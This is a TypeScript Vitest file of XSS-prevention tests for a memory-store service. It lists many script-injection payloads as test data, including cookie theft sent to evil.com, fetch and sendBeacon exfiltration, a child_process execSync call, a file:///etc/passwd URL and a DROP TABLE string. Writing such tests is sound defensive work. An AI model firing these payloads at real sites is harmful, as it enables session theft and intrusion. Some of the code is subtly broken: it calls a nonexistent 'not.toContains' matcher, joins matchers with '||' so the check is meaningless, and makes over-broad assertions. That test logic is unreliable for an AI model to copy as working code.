/**
 * Cross-Site Scripting (XSS) Prevention Security Tests
 *
 * Comprehensive testing for XSS prevention including:
 * - Reflected XSS attack prevention
 * - Stored XSS attack prevention
 * - DOM-based XSS prevention
 * - Content Security Policy enforcement
 * - HTML sanitization and escaping
 * - JavaScript injection prevention
 * - CSS-based XSS prevention
 * - SVG-based XSS prevention
 * - Meta tag injection prevention
 * - Protocol-based XSS prevention
 * - Encoding and decoding security
 * - Context-aware XSS prevention
 * - Template literal XSS prevention
 * - JSON-based XSS prevention
 * - URL-based XSS prevention
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { memoryStore } from '../../src/services/memory-store.js';
import { smartMemoryFind } from '../../src/services/smart-find.js';
import { validateMemoryStoreInput, validateMemoryFindInput } from '../../src/schemas/mcp-inputs.js';
import { sanitizeQuery } from '../../src/utils/query-sanitizer.js';
import { logger } from '../../src/utils/logger.js';

describe('XSS Prevention Security Tests', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  describe('Reflected XSS Prevention', () => {
    it('should prevent reflected XSS through URL parameters', () => {
      const reflectedXssPayloads = [
        '<script>alert("XSS")</script>',
        '<SCRIPT SRC="http://evil.com/xss.js"></SCRIPT>',
        '<script>document.location="http://evil.com/steal?cookie="+document.cookie</script>',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        '<body onload=alert("XSS")>',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<input onfocus=alert("XSS") autofocus>',
        '<select onfocus=alert("XSS") autofocus>',
        '<textarea onfocus=alert("XSS") autofocus>',
        '<keygen onfocus=alert("XSS") autofocus>',
        '<video><source onerror="alert(\'XSS\')">',
        '<details open ontoggle=alert("XSS")>',
        '<marquee onstart=alert("XSS")>',
        '<isindex action="javascript:alert(\'XSS\')" type="submit">',
        '<form><button formaction="javascript:alert(\'XSS\')">XSS</button></form>',
      ];

      for (const payload of reflectedXssPayloads) {
        const maliciousItem = {
          items: [{
            kind: 'entity' as const,
            scope: { project: 'test-project' },
            data: {
              name: payload,
              entity_type: 'test',
              description: `User input: ${payload}`,
              user_provided_content: payload
            }
          }]
        };

        try {
          const result = validateMemoryStoreInput(maliciousItem.items);

          // Should either reject or sanitize the input
          if (result.success) {
            // If accepted, the data should be sanitized
            expect(result.data![0].data.name).not.toContain('<script>');
            expect(result.data![0].data.name).not.toContain('onerror=');
            expect(result.data![0].data.name).not.toContain('onload=');
            expect(result.data![0].data.name).not.toContain('javascript:');
          } else {
            // Rejection is preferred for obvious XSS
            expect(result.error).toBeDefined();
          }
        } catch (error) {
          // Exception is acceptable for malicious input
          expect(error).toBeInstanceOf(Error);
        }
      }
    });

    it('should prevent reflected XSS through query strings', () => {
      const queryStringAttacks = [
        '?search=<script>alert("XSS")</script>',
        '?q=<img src=x onerror=alert(1)>',
        '?input=<svg onload=alert(1)>',
        '?term=<iframe src="javascript:alert(1)"></iframe>',
        '?find=<body onload=alert(1)>',
        '?query=<input onfocus=alert(1) autofocus>',
        '?filter=<select onfocus=alert(1) autofocus>',
        '?sort=<textarea onfocus=alert(1) autofocus>',
        '?view=<details open ontoggle=alert(1)>',
        '?type=<marquee onstart=alert(1)>',
      ];

      for (const queryAttack of queryStringAttacks) {
        const sanitized = sanitizeQuery(queryAttack, 'aggressive');

        // Should remove or neutralize XSS payloads
        expect(sanitized.cleaned).not.toContain('<script>');
        expect(sanitized.cleaned).not.toContain('onerror=');
        expect(sanitized.cleaned).not.toContain('onload=');
        expect(sanitized.cleaned).not.toContain('javascript:');
        expect(sanitized.cleaned).not.toContain('<iframe');
        expect(sanitized.cleaned).not.toContain('<svg');
        expect(sanitized.cleaned).not.toContain('<img');
        expect(sanitized.cleaned).not.toContain('<body');
        expect(sanitized.cleaned).not.toContain('<input');
        expect(sanitized.cleaned).not.toContain('<select');
        expect(sanitized.cleaned).not.toContain('<textarea');
        expect(sanitized.cleaned).not.toContain('<details');
        expect(sanitized.cleaned).not.toContain('<marquee');
      }
    });
  });

  describe('Stored XSS Prevention', () => {
    it('should prevent stored XSS in database entries', async () => {
      const storedXssPayloads = [
        '<script>steal_data()</script>',
        '<img src="invalid" onerror="fetch(\'/api/steal?cookie=\'+document.cookie)">',
        '<svg onload="navigator.sendBeacon(\'/evil\', document.cookie)">',
        '<iframe src="http://evil.com/collect.html"></iframe>',
        '<link rel="prefetch" href="http://evil.com/steal?data=',
        '<meta http-equiv="refresh" content="0;url=http://evil.com/steal">',
        '<form action="http://evil.com/collect"><input type="submit"></form>',
        '<button onclick="navigator.clipboard.writeText(document.cookie)">Copy</button>',
        '<details open ontoggle="fetch(\'/api/steal\', {method:\'POST\',body:document.cookie})">',
      ];

      for (const payload of storedXssPayloads) {
        const maliciousItem = {
          items: [{
            kind: 'entity' as const,
            scope: { project: 'test-project' },
            data: {
              name: 'Stored XSS Test',
              entity_type: 'malicious_content',
              content: payload,
              user_comment: payload,
              description: `User submitted: ${payload}`
            }
          }]
        };

        try {
          const result = await memoryStore(maliciousItem.items);

          if (result.stored.length > 0) {
            const storedData = JSON.stringify(result.stored);

            // Stored data should not contain executable scripts
            expect(storedData).not.toContain('<script>');
            expect(storedData).not.toContain('onerror=');
            expect(storedData).not.toContain('onload=');
            expect(storedData).not.toContain('onclick=');
            expect(storedData).not.toContain('ontoggle=');
            expect(storedData).not.toContain('javascript:');
            expect(storedData).not.toContain('fetch(');
            expect(storedData).not.toContain('navigator.clipboard');
            expect(storedData).not.toContain('navigator.sendBeacon');
            expect(storedData).not.toContain('http-equiv=');
          }
        } catch (error) {
          // Rejection is acceptable for malicious content
          expect(error).toBeInstanceOf(Error);
        }
      }
    });

    it('should prevent stored XSS in user profiles and metadata', async () => {
      const profileXssAttacks = {
        username: '<script>alert("XSS")</script>',
        bio: '<img src=x onerror=alert("XSS")>',
        avatar_url: 'javascript:alert("XSS")',
        signature: '<svg onload=alert("XSS")>',
        location: '<iframe src="javascript:alert(1)"></iframe>',
        website: 'data:text/html,<script>alert(1)</script>',
        custom_fields: {
          theme: '<style>body{background:url(javascript:alert(1))}</style>',
          layout: '<div onclick=alert(1)>Click me</div>',
          widgets: '<script src="http://evil.com/widget.js"></script>'
        }
      };

      const maliciousProfile = {
        items: [{
          kind: 'entity' as const,
          scope: { project: 'test-project' },
          data: {
            name: 'User Profile',
            entity_type: 'user_profile',
            profile_data: profileXssAttacks
          }
        }]
      };

      try {
        const result = await memoryStore(maliciousProfile.items);

        if (result.stored.length > 0) {
          const storedData = JSON.stringify(result.stored);

          expect(storedData).not.toContain('<script>');
          expect(storedData).not.toContain('onerror=');
          expect(storedData).not.toContain('onload=');
          expect(storedData).not.toContain('onclick=');
          expect(storedData).not.toContain('javascript:');
          expect(storedData).not.toContain('data:text/html');
          expect(storedData).not.toContain('<style>');
          expect(storedData).not.toContain('background:url(javascript:');
        }
      } catch (error) {
        expect(error).toBeInstanceOf(Error);
      }
    });
  });

  describe('DOM-based XSS Prevention', () => {
    it('should prevent DOM-based XSS through dangerous sinks', () => {
      const domXssPayloads = [
        '#<script>alert("XSS")</script>',
        '#<img src=x onerror=alert("XSS")>',
        '#<svg onload=alert("XSS")>',
        '#javascript:alert("XSS")',
        '#data:text/html,<script>alert("XSS")</script>',
        '#vbscript:msgbox("XSS")',
        '#<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '#<object data="javascript:alert(\'XSS\')"></object>',
        '#<embed src="javascript:alert(\'XSS\')"></embed>',
        '#<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
        '#<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',
      ];

      for (const payload of domXssPayloads) {
        const sanitized = sanitizeQuery(payload, 'aggressive');

        // Should remove DOM-based XSS vectors
        expect(sanitized.cleaned).not.toContain('<script>');
        expect(sanitized.cleaned).not.toContain('onerror=');
        expect(sanitized.cleaned).not.toContain('onload=');
        expect(sanitized.cleaned).not.toContain('javascript:');
        expect(sanitized.cleaned).not.toContain('data:text/html');
        expect(sanitized.cleaned).not.toContain('vbscript:');
        expect(sanitized.cleaned).not.toContain('<iframe');
        expect(sanitized.cleaned).not.toContain('<object');
        expect(sanitized.cleaned).not.toContain('<embed');
        expect(sanitized.cleaned).not.toContain('http-equiv=');
      }
    });

    it('should prevent XSS through DOM manipulation', () => {
      const domManipulationPayloads = [
        'document.write("<script>alert(\'XSS\')</script>")',
        'innerHTML = "<img src=x onerror=alert(1)>"',
        'outerHTML = "<svg onload=alert(1)>"',
        'document.createElement("script").src="evil.js"',
        'eval("alert(\'XSS\')")',
        'setTimeout("alert(\'XSS\')", 0)',
        'setInterval("alert(\'XSS\')", 1000)',
        'Function("alert(\'XSS\')")()',
        'constructor.constructor("alert(\'XSS\')")()',
        'globalThis.eval("alert(\'XSS\')")',
        'window.execScript("alert(\'XSS\')")', // IE
        'document.body.innerHTML = "<script>alert(1)</script>"',
      ];

      for (const payload of domManipulationPayloads) {
        const sanitized = sanitizeQuery(payload, 'aggressive');

        // Should remove DOM manipulation vectors
        expect(sanitized.cleaned).not.toContain('document.write');
        expect(sanitized.cleaned).not.toContain('innerHTML');
        expect(sanitized.cleaned).not.toContain('outerHTML');
        expect(sanitized.cleaned).not.toContain('createElement("script")');
        expect(sanitized.cleaned).not.toContain('eval(');
        expect(sanitized.cleaned).not.toContain('setTimeout(');
        expect(sanitized.cleaned).not.toContain('setInterval(');
        expect(sanitized.cleaned).not.toContain('Function(');
        expect(sanitized.cleaned).not.toContain('constructor.constructor');
        expect(sanitized.cleaned).not.toContain('execScript');
      }
    });
  });

  describe('Content Security Policy Enforcement', () => {
    it('should prevent CSP bypass attempts', () => {
      const cspBypassPayloads = [
        '<meta http-equiv="Content-Security-Policy" content="script-src \'none\'">',
        '<meta http-equiv="refresh" content="0;url=http://evil.com/">',
        '<meta http-equiv="Location" content="http://evil.com/">',
        '<base href="http://evil.com/">',
        '<object data="http://evil.com/"></object>',
        '<embed src="http://evil.com/">',
        '<applet code="http://evil.com/evil.class">',
        '<link rel="prefetch" href="http://evil.com/">',
        '<link rel="dns-prefetch" href="http://evil.com/">',
        '<link rel="preconnect" href="http://evil.com/">',
        '<link rel="stylesheet" href="data:text/css,script-src(\'none\')">',
        '<style>@import "javascript:alert(\'XSS\')";</style>',
      ];

      for (const cspPayload of cspBypassPayloads) {
        const sanitized = sanitizeQuery(cspPayload, 'aggressive');

        // Should remove CSP bypass patterns
        expect(sanitized.cleaned).not.toContain('http-equiv=');
        expect(sanitized.cleaned).not.toContain('refresh');
        expect(sanitized.cleaned).not.toContain('Location');
        expect(sanitized.cleaned).not.toContain('Content-Security-Policy');
        expect(sanitized.cleaned).not.toContain('<base');
        expect(sanitized.cleaned).not.toContain('<object');
        expect(sanitized.cleaned).not.toContain('<embed');
        expect(sanitized.cleaned).not.toContain('<applet');
        expect(sanitized.cleaned).not.toContain('rel="prefetch"');
        expect(sanitized.cleaned).not.toContain('rel="dns-prefetch"');
        expect(sanitized.cleaned).not.toContain('rel="preconnect"');
        expect(sanitized.cleaned).not.toContain('@import');
        expect(sanitized.cleaned).not.toContain('javascript:');
      }
    });

    it('should handle script-src policy bypass attempts', () => {
      const scriptSrcBypassPayloads = [
        '<script src="data:text/javascript,alert(\'XSS\')"></script>',
        '<script src="blob:null/12345678-1234-1234-1234-123456789012"></script>',
        '<script src="filesystem:http://evil.com/temporary/xss.js"></script>',
        '<script>import("data:text/javascript,alert(\'XSS\')")</script>',
        '<script>fetch("data:text/javascript,alert(\'XSS\')").then(r=>r.text()).then(eval)</script>',
        '<script src="/path/to/allowed.js?callback=alert(\'XSS\')"></script>',
        '<script src="https://allowed-cdn.com/lib.js"></script><script>alert(\'XSS\')</script>',
        '<script src="allowed.js"></script><script src="evil.js"></script>',
      ];

      for (const bypassPayload of scriptSrcBypassPayloads) {
        const sanitized = sanitizeQuery(bypassPayload, 'aggressive');

        // Should remove script-src bypass patterns
        expect(sanitized.cleaned).not.toContain('data:text/javascript');
        expect(sanitized.cleaned).not.toContain('blob:null');
        expect(sanitized.cleaned).not.toContain('filesystem:');
        expect(sanitized.cleaned).not.toContain('import(');
        expect(sanitized.cleaned).not.toContain('fetch(');
        expect(sanitized.cleaned).not.toContains('callback=');
        expect(sanitized.cleaned).not.toContains('</script><script>');
      }
    });
  });

  describe('HTML Sanitization and Escaping', () => {
    it('should properly escape HTML entities', () => {
      const htmlEntityPayloads = [
        '<script>alert("XSS")</script>',
        '&lt;script&gt;alert("XSS")&lt;/script&gt;',
        '&#60;script&#62;alert("XSS")&#60;/script&#62;',
        '&#x3C;script&#x3E;alert("XSS")&#x3C;/script&#x3E;',
        '&amp;lt;script&amp;gt;alert(&amp;quot;XSS&amp;quot;)&amp;lt;/script&amp;gt;',
        '%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E',
        '%u003c%u0073%u0063%u0072%u0069%u0070%u0074%u003e',
      ];

      for (const entityPayload of htmlEntityPayloads) {
        const sanitized = sanitizeQuery(entityPayload, 'aggressive');

        // Should handle encoded HTML entities safely
        expect(sanitized.cleaned).not.toContain('<script>');
        expect(sanitized.cleaned).not.toContain('alert(');
        expect(sanitized.cleaned).not.toContains('</script>');
      }
    });

    it('should sanitize HTML attributes properly', () => {
      const attributeXssPayloads = [
        '<div onclick="alert(\'XSS\')">Click me</div>',
        '<img src="valid.jpg" onmouseover="alert(\'XSS\')">',
        '<a href="javascript:alert(\'XSS\')">Link</a>',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<object data="javascript:alert(\'XSS\')"></object>',
        '<embed src="javascript:alert(\'XSS\')"></embed>',
        '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
        '<style>@import "javascript:alert(\'XSS\')";</style>',
        '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',
        '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
        '<button formaction="javascript:alert(\'XSS\')">Submit</button>',
        '<input type="image" src="valid.jpg" formaction="javascript:alert(\'XSS\')">',
      ];

      for (const attrPayload of attributeXssPayloads) {
        const sanitized = sanitizeQuery(attrPayload, 'aggressive');

        // Should remove dangerous attributes
        expect(sanitized.cleaned).not.toContain('onclick=');
        expect(sanitized.cleaned).not.toContain('onmouseover=');
        expect(sanitized.cleaned).not.toContain('javascript:');
        expect(sanitized.cleaned).not.toContain('@import');
        expect(sanitized.cleaned).not.toContain('http-equiv=');
        expect(sanitized.cleaned).not.toContain('formaction=');
      }
    });
  });

  describe('JavaScript Injection Prevention', () => {
    it('should prevent JavaScript injection through various vectors', () => {
      const jsInjectionPayloads = [
        'javascript:alert("XSS")',
        'javascript:void(0);alert("XSS")',
        'javascript://comment%0Aalert("XSS")',
        'javascript:\nalert("XSS")',
        'javascript:\r\nalert("XSS")',
        'javascript:%0Aalert("XSS")',
        'javascript:%0D%0Aalert("XSS")',
        'javascript:/*comment*/alert("XSS")',
        'javascript:/*%0Aalert("XSS")*/',
        'javascript:alert(document.cookie)',
        'javascript:fetch("/api/steal?cookie="+document.cookie)',
        'javascript:navigator.sendBeacon("/evil", document.cookie)',
      ];

      for (const jsPayload of jsInjectionPayloads) {
        const sanitized = sanitizeQuery(jsPayload, 'aggressive');

        // Should remove JavaScript injection vectors
        expect(sanitized.cleaned).not.toContain('javascript:');
        expect(sanitized.cleaned).not.toContain('alert(');
        expect(sanitized.cleaned).not.toContain('document.cookie');
        expect(sanitized.cleaned).not.toContain('fetch(');
        expect(sanitized.cleaned).not.toContain('navigator.sendBeacon');
      }
    });

    it('should prevent eval and similar dangerous functions', () => {
      const dangerousFunctionPayloads = [
        'eval("alert(\'XSS\')")',
        'setTimeout("alert(\'XSS\')", 0)',
        'setInterval("alert(\'XSS\')", 1000)',
        'Function("alert(\'XSS\')")()',
        'constructor.constructor("alert(\'XSS\')")()',
        'globalThis.eval("alert(\'XSS\')")',
        'window.execScript("alert(\'XSS\')")',
        'document.write("<script>alert(\'XSS\')</script>")',
        'document.writeln("<script>alert(\'XSS\')</script>")',
        'innerHTML = "<script>alert(\'XSS\')</script>"',
        'outerHTML = "<script>alert(\'XSS\')</script>"',
        'insertAdjacentHTML("afterbegin", "<script>alert(\'XSS\')</script>")',
      ];

      for (const dangerousPayload of dangerousFunctionPayloads) {
        const sanitized = sanitizeQuery(dangerousPayload, 'aggressive');

        // Should remove dangerous function calls
        expect(sanitized.cleaned).not.toContain('eval(');
        expect(sanitized.cleaned).not.toContain('setTimeout(');
        expect(sanitized.cleaned).not.toContain('setInterval(');
        expect(sanitized.cleaned).not.toContain('Function(');
        expect(sanitized.cleaned).not.toContain('constructor.constructor');
        expect(sanitized.cleaned).not.toContain('execScript');
        expect(sanitized.cleaned).not.toContain('document.write');
        expect(sanitized.cleaned).not.toContain('document.writeln');
        expect(sanitized.cleaned).not.toContain('innerHTML');
        expect(sanitized.cleaned).not.toContain('outerHTML');
        expect(sanitized.cleaned).not.toContain('insertAdjacentHTML');
      }
    });
  });

  describe('CSS-based XSS Prevention', () => {
    it('should prevent CSS-based XSS attacks', () => {
      const cssXssPayloads = [
        '<style>@import "javascript:alert(\'XSS\')";</style>',
        '<style>body { background: url("javascript:alert(\'XSS\')"); }</style>',
        '<style>body { expression(alert("XSS")); }</style>',
        '<style>body { behavior: url(xss.htc); }</style>',
        '<style>body { binding: url("javascript:alert(\'XSS\')"); }</style>',
        '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
        '<style>@font-face { src: url("javascript:alert(\'XSS\')"); }</style>',
        '<style>list-style-image: url("javascript:alert(\'XSS\')");</style>',
        '<style>background: url("javascript:alert(\'XSS\')");</style>',
        '<style>content: url("javascript:alert(\'XSS\')");</style>',
      ];

      for (const cssPayload of cssXssPayloads) {
        const sanitized = sanitizeQuery(cssPayload, 'aggressive');

        // Should remove CSS-based XSS vectors
        expect(sanitized.cleaned).not.toContain('@import');
        expect(sanitized.cleaned).not.toContain('javascript:');
        expect(sanitized.cleaned).not.toContain('expression(');
        expect(sanitized.cleaned).not.toContain('behavior:');
        expect(sanitized.cleaned).not.toContain('binding:');
        expect(sanitized.cleaned).not.toContains('@font-face');
        expect(sanitized.cleaned).not.toContains('list-style-image');
        expect(sanitized.cleaned).not.toContains('background: url(');
        expect(sanitized.cleaned).not.toContains('content: url(');
      }
    });

    it('should prevent CSS expression injection', () => {
      const cssExpressionPayloads = [
        'expression(alert("XSS"))',
        'expression((function(){alert("XSS")})())',
        'expression(window.location="http://evil.com")',
        'expression(document.write("<script>alert(\'XSS\')</script>"))',
        'expression(eval("alert(\'XSS\')"))',
        'expression(Function("alert(\'XSS\')")())',
        'expression(navigator.sendBeacon("/evil", document.cookie))',
        'expression(fetch("/api/steal", {method:"POST",body:document.cookie}))',
      ];

      for (const exprPayload of cssExpressionPayloads) {
        const sanitized = sanitizeQuery(exprPayload, 'aggressive');

        // Should remove CSS expression injections
        expect(sanitized.cleaned).not.toContain('expression(');
        expect(sanitized.cleaned).not.toContain('alert(');
        expect(sanitized.cleaned).not.toContain('window.location');
        expect(sanitized.cleaned).not.toContain('document.write');
        expect(sanitized.cleaned).not.toContain('eval(');
        expect(sanitized.cleaned).not.toContain('Function(');
        expect(sanitized.cleaned).not.toContain('navigator.sendBeacon');
        expect(sanitized.cleaned).not.toContain('fetch(');
      }
    });
  });

  describe('SVG-based XSS Prevention', () => {
    it('should prevent SVG-based XSS attacks', () => {
      const svgXssPayloads = [
        '<svg onload=alert("XSS")>',
        '<svg onload="alert(\'XSS\')">',
        '<svg><script>alert("XSS")</script></svg>',
        '<svg><animate attributeName="href" values="javascript:alert(\'XSS\')"/></svg>',
        '<svg><set attributeName="onmouseover" to="alert(\'XSS\')"/></svg>',
        '<svg><a href="javascript:alert(\'XSS\')"><text>Click</text></a></svg>',
        '<svg><foreignObject width="100" height="100"><iframe src="javascript:alert(\'XSS\')"></iframe></foreignObject></svg>',
        '<svg><image href="javascript:alert(\'XSS\')"/></svg>',
        '<svg><use href="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+"/></svg>',
        '<svg onload="fetch(\'/api/steal?cookie=\'+document.cookie)">',
      ];

      for (const svgPayload of svgXssPayloads) {
        const sanitized = sanitizeQuery(svgPayload, 'aggressive');

        // Should remove SVG-based XSS vectors
        expect(sanitized.cleaned).not.toContain('<svg');
        expect(sanitized.cleaned).not.toContain('onload=');
        expect(sanitized.cleaned).not.toContain('<script>');
        expect(sanitized.cleaned).not.toContain('animate');
        expect(sanitized.cleaned).not.toContain('set');
        expect(sanitized.cleaned).not.toContain('href=');
        expect(sanitized.cleaned).not.toContain('javascript:');
        expect(sanitized.cleaned).not.toContain('<foreignObject');
        expect(sanitized.cleaned).not.toContain('<iframe');
        expect(sanitized.cleaned).not.toContain('fetch(');
      }
    });
  });

  describe('Protocol-based XSS Prevention', () => {
    it('should prevent dangerous protocol handlers', () => {
      const protocolPayloads = [
        'javascript:alert("XSS")',
        'data:text/html,<script>alert("XSS")</script>',
        'data:text/css,<style>body{background:url(javascript:alert(1))}</style>',
        'data:text/javascript,alert("XSS")',
        'vbscript:msgbox("XSS")',
        'file:///etc/passwd',
        'ftp://evil.com/xss.js',
        'gopher://evil.com:70/_javascript:alert(1)',
        'dict://evil.com:11211/javascript:alert(1)',
        'ldap://evil.com:389/javascript:alert(1)',
        'tftp://evil.com:69/xss.js',
        'mailto:test@example.com?subject=<script>alert(1)</script>',
        'tel:<script>alert(1)</script>',
        'sms:<script>alert(1)</script>',
      ];

      for (const protocolPayload of protocolPayloads) {
        const sanitized = sanitizeQuery(protocolPayload, 'aggressive');

        // Should remove dangerous protocols
        expect(sanitized.cleaned).not.toContain('javascript:');
        expect(sanitized.cleaned).not.toContain('data:text/html');
        expect(sanitized.cleaned).not.toContain('data:text/css');
        expect(sanitized.cleaned).not.toContain('data:text/javascript');
        expect(sanitized.cleaned).not.toContain('vbscript:');
        expect(sanitized.cleaned).not.toContain('file:///');
        expect(sanitized.cleaned).not.toContain('ftp://');
        expect(sanitized.cleaned).not.toContain('gopher://');
        expect(sanitized.cleaned).not.toContain('dict://');
        expect(sanitized.cleaned).not.toContain('ldap://');
        expect(sanitized.cleaned).not.toContain('tftp://');
      }
    });
  });

  describe('Template Literal XSS Prevention', () => {
    it('should prevent template literal injection', () => {
      const templatePayloads = [
        '`alert("XSS")`',
        '${alert("XSS")}',
        '${`alert("XSS")`}',
        '${constructor.constructor("alert(\'XSS\')")()}',
        '${globalThis.eval("alert(\'XSS\')")}',
        '${process.mainModule.require("child_process").execSync("calc")}',
        '${require("child_process").execSync("calc")}',
        '${import("data:text/javascript,alert(1)").then(m=>m.default)}',
        '${function(){alert("XSS")}()}',
        '${(()=>{alert("XSS")})()}',
        '${setTimeout("alert(\'XSS\')",0)}',
        '${setInterval("alert(\'XSS\')",1000)}',
      ];

      for (const templatePayload of templatePayloads) {
        const sanitized = sanitizeQuery(templatePayload, 'aggressive');

        // Should remove template literal injection vectors
        expect(sanitized.cleaned).not.toContain('alert(');
        expect(sanitized.cleaned).not.toContain('${');
        expect(sanitized.cleaned).not.toContains('}');
        expect(sanitized.cleaned).not.toContains('constructor.constructor');
        expect(sanitized.cleaned).not.toContains('globalThis.eval');
        expect(sanitized.cleaned).not.toContains('require(');
        expect(sanitized.cleaned).not.toContains('import(');
        expect(sanitized.cleaned).not.toContains('setTimeout(');
        expect(sanitized.cleaned).not.toContains('setInterval(');
      }
    });
  });

  describe('JSON-based XSS Prevention', () => {
    it('should prevent JSON-based XSS attacks', () => {
      const jsonXssPayloads = [
        '{"script":"<script>alert(\'XSS\')</script>"}',
        '{"html":"<img src=x onerror=alert(1)>"}',
        '{"callback":"alert(\'XSS\')"}',
        '{"jsonp":"callback(\'XSS\')"}',
        '{"redirect":"javascript:alert(\'XSS\')"}',
        '{"iframe":"<iframe src=javascript:alert(1)></iframe>"}',
        '{"object":"<object data=javascript:alert(1)></object>"}',
        '{"embed":"<embed src=javascript:alert(1)>"}',
        '{"link":"<link rel=stylesheet href=javascript:alert(1)>"}',
        '{"meta":"<meta http-equiv=refresh content=0;url=javascript:alert(1)>"}',
      ];

      for (const jsonPayload of jsonXssPayloads) {
        const sanitized = sanitizeQuery(jsonPayload, 'aggressive');

        // Should remove JSON-based XSS vectors
        expect(sanitized.cleaned).not.toContain('<script>');
        expect(sanitized.cleaned).not.toContain('onerror=');
        expect(sanitized.cleaned).not.toContain('javascript:');
        expect(sanitized.cleaned).not.toContain('<iframe');
        expect(sanitized.cleaned).not.toContain('<object');
        expect(sanitized.cleaned).not.toContain('<embed');
        expect(sanitized.cleaned).not.toContain('<link');
        expect(sanitized.cleaned).not.toContain('http-equiv=');
      }
    });
  });

  describe('URL-based XSS Prevention', () => {
    it('should prevent URL-based XSS attacks', () => {
      const urlXssPayloads = [
        'http://evil.com/<script>alert("XSS")</script>',
        'https://evil.com/<img src=x onerror=alert(1)>',
        'javascript:alert("XSS")',
        'data:text/html,<script>alert("XSS")</script>',
        'vbscript:msgbox("XSS")',
        'http://evil.com/?q=<script>alert("XSS")</script>',
        'https://evil.com/#<svg onload=alert(1)>',
        'http://evil.com/path/<iframe src=javascript:alert(1)></iframe>',
        'https://evil.com/search?q="><script>alert("XSS")</script>',
        'http://evil.com/redirect?url=javascript:alert("XSS")',
      ];

      for (const urlPayload of urlXssPayloads) {
        const sanitized = sanitizeQuery(urlPayload, 'aggressive');

        // Should remove URL-based XSS vectors
        expect(sanitized.cleaned).not.toContain('<script>');
        expect(sanitized.cleaned).not.toContain('onerror=');
        expect(sanitized.cleaned).not.toContain('javascript:');
        expect(sanitized.cleaned).not.toContain('data:text/html');
        expect(sanitized.cleaned).not.toContain('vbscript:');
        expect(sanitized.cleaned).not.toContains('<svg');
        expect(sanitized.cleaned).not.toContains('<iframe');
      }
    });
  });

  describe('XSS Logging and Monitoring', () => {
    it('should log XSS attempts appropriately', async () => {
      const xssAttempts = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert(1)>',
        'javascript:alert("XSS")',
        'data:text/html,<script>alert(1)</script>',
      ];

      for (const xssAttempt of xssAttempts) {
        const logSpy = vi.spyOn(logger, 'warn');

        try {
          const maliciousItem = {
            items: [{
              kind: 'entity' as const,
              scope: { project: 'test-project' },
              data: {
                name: xssAttempt,
                entity_type: 'test'
              }
            }]
          };

          await memoryStore(maliciousItem.items);

          // Should log XSS attempts
          expect(logSpy).toHaveBeenCalledWith(
            expect.stringContaining('XSS') ||
            expect.stringContaining('sanitized') ||
            expect.stringContaining('malicious')
          );
        } catch (error) {
          // Should also log rejected malicious input
          expect(logSpy).toHaveBeenCalledWith(
            expect.stringContaining('rejected') ||
            expect.stringContaining('invalid') ||
            expect.stringContaining('malicious')
          );
        } finally {
          logSpy.mockRestore();
        }
      }
    });

    it('should detect XSS attack patterns', () => {
      const xssPatterns = [
        { input: '<script>alert("XSS")</script>', isXss: true },
        { input: '<img src=x onerror=alert(1)>', isXss: true },
        { input: 'javascript:alert("XSS")', isXss: true },
        { input: 'data:text/html,<script>alert(1)</script>', isXss: true },
        { input: 'normal text', isXss: false },
        { input: 'hello world', isXss: false },
        { input: '<p>normal html</p>', isXss: false },
        { input: 'http://example.com', isXss: false },
      ];

      for (const pattern of xssPatterns) {
        const sanitized = sanitizeQuery(pattern.input, 'moderate');

        if (pattern.isXss) {
          // XSS patterns should be detected and sanitized
          expect(sanitized.cleaned).not.toBe(pattern.input);
          expect(sanitized.risk_score).toBeGreaterThan(5);
        } else {
          // Non-XSS content should be preserved
          expect(sanitized.risk_score).toBeLessThan(5);
        }
      }
    });
  });

  describe('Context-Aware XSS Prevention', () => {
    it('should apply context-specific XSS prevention', () => {
      const contexts = [
        {
          context: 'html',
          input: '<script>alert("XSS")</script>',
          expectedSanitized: true
        },
        {
          context: 'attribute',
          input: 'javascript:alert("XSS")',
          expectedSanitized: true
        },
        {
          context: 'javascript',
          input: 'alert("XSS")',
          expectedSanitized: true
        },
        {
          context: 'css',
          input: 'expression(alert("XSS"))',
          expectedSanitized: true
        },
        {
          context: 'url',
          input: 'javascript:alert("XSS")',
          expectedSanitized: true
        },
        {
          context: 'json',
          input: '{"script":"<script>alert(\\"XSS\\")</script>"}',
          expectedSanitized: true
        },
      ];

      for (const { context, input, expectedSanitized } of contexts) {
        const sanitized = sanitizeQuery(input, 'aggressive');

        if (expectedSanitized) {
          expect(sanitized.cleaned).not.toBe(input);
          expect(sanitized.risk_score).toBeGreaterThan(3);
        }
      }
    });
  });

  describe('XSS Prevention Compliance', () => {
    it('should comply with OWASP XSS prevention guidelines', () => {
      const owaspTestCases = [
        // Rule 1: Use appropriate output encoding
        { input: '<script>alert("XSS")</script>', context: 'html' },
        { input: 'javascript:alert("XSS")', context: 'attribute' },
        { input: '" onclick="alert(\'XSS\')', context: 'javascript' },

        // Rule 2: Validate input
        { input: '../../../etc/passwd', context: 'filename' },
        { input: 'admin@user.com<script>alert(1)</script>', context: 'email' },

        // Rule 3: Parameterize queries
        { input: "'; DROP TABLE users; --", context: 'sql' },

        // Rule 4: Encode output
        { input: '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;', context: 'html' },
        { input: '%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E', context: 'url' },
      ];

      for (const testCase of owaspTestCases) {
        const sanitized = sanitizeQuery(testCase.input, 'aggressive');

        // Should prevent XSS according to OWASP guidelines
        expect(sanitized.cleaned).not.toContain('<script>');
        expect(sanitized.cleaned).not.toContain('javascript:');
        expect(sanitized.cleaned).not.toContain('onclick=');
        expect(sanitized.cleaned).not.toContain('DROP TABLE');
        expect(sanitized.risk_score).toBeGreaterThanOrEqual(0);
      }
    });

    it('should handle browser-specific XSS vectors', () => {
